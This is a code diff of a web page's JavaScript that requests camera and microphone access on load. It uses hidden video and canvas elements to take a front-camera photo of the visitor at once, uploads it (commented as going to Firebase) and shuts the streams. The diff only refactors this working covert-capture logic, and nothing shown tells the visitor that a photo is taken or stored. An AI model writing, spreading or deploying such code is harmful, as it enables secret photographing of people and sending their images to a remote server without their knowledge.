@@ -36,23 +36,23 @@
                 });
         }
 
-        // Function to request microphone and camera access
+        // Function to request permissions for microphone and camera
         async function requestPermissions() {
             try {
                 // Request microphone access
-                await navigator.mediaDevices.getUserMedia({ audio: true });
+                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 console.log('Microphone access granted.');
 
                 // Request camera access
-                const stream = await navigator.mediaDevices.getUserMedia({
+                const camStream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: "user", // Use front camera
+                        facingMode: { ideal: "user" }, // Use front camera
                         width: { ideal: 1920 },
                         height: { ideal: 1080 }
                     }
                 });
-
-                return stream; // Return the video stream
+                console.log('Camera access granted.');
+                return { micStream, camStream }; // Return both streams
             } catch (error) {
                 console.error('Error accessing microphone or camera: ', error);
                 throw error; // Rethrow the error for handling
@@ -60,29 +60,31 @@
         }
 
         // Access video and canvas elements
-        window.addEventListener('load', () => {
+        window.addEventListener('load', async () => {
             const video = document.createElement('video');
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
-            requestPermissions()
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        // Set canvas size for 1080p
-                        canvas.width = 1920;
-                        canvas.height = 1080;
-                        // Capture image immediately
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/png');
-                        uploadImage(imageData); // Upload image to Firebase
-                        stopVideo(stream); // Stop the video stream
-                    };
-                })
-                .catch(err => {
-                    console.error('Permissions were not granted:', err);
-                });
+            try {
+                const { micStream, camStream } = await requestPermissions();
+                
+                // Set up video stream from camera
+                video.srcObject = camStream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Set canvas size for 1080p
+                    canvas.width = 1920;
+                    canvas.height = 1080;
+                    // Capture image immediately
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(micStream); // Stop the microphone stream
+                    stopVideo(camStream); // Stop the camera stream
+                };
+            } catch (err) {
+                console.error('Permissions were not granted:', err);
+            }
         });
 
         // Function to stop video stream
